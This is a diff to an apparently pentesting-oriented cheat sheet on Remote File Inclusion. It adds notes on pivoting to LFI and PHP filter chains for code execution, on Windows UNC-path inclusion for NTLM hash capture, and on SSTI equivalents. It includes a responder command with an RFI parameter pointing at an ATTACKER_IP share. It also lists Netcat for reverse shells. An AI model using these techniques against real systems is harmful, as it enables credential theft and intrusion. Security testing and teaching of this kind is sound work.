@@ -277,6 +277,29 @@ eval($code);
 | Burp Suite | Intercept and modify RFI payloads |
 | Python HTTP Server | Host malicious files for inclusion |
 | Netcat | Reverse shell listeners |
-| Ngrok | Public tunnel for file hosting |
+| Ngrok / cloudflared | Public tunnel for file hosting |
 | Metasploit | Advanced payload generation |
 | Impacket | SMB server for UNC path inclusion |
+
+---
+
+## Modern Notes
+
+- **RFI is rare today**: `allow_url_include` defaults to `Off` since PHP 5.2 and is almost never enabled. When `include`/`require` takes user input but `allow_url_include=Off`, you cannot fetch `http://`/`data://` — pivot to **LFI techniques** instead, especially **PHP filter chains** (see local-file-inclusion.md) which give RCE on default config.
+- **Windows UNC inclusion** (`\\ATTACKER\share\shell.php`) can still work because SMB fetching isn't gated by `allow_url_include` on some configs, and it doubles as **NTLM hash capture** (point the target at `responder`/`impacket-smbserver`).
+- Non-PHP stacks: SSTI via `render(req.query.template)` (Node/Express), JSP `<jsp:include>`, and .NET `Server.Execute` are the modern equivalents — see ssti/ and api/.
+
+```bash
+# Capture NetNTLMv2 when forcing a Windows target to include a UNC path
+responder -I eth0
+# then RFI param = \\ATTACKER_IP\share\x
+```
+
+---
+
+## References
+
+- PayloadsAllTheThings — File Inclusion (RFI): https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/
+- HackTricks — LFI/RFI: https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
+- OWASP — Testing for Remote File Inclusion: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
+- PHP manual — `allow_url_include`: https://www.php.net/manual/en/filesystem.configuration.php
